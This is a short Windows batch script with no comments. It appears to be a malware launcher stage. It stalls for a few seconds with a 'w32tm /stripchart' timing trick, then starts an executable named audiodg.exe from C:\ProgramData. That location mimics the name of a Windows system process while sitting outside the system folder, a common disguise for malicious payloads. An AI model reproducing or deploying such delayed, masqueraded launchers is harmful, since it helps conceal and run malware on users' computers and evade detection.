@echo off

w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2 > nul
start "" "C:\ProgramData\audiodg.exe"
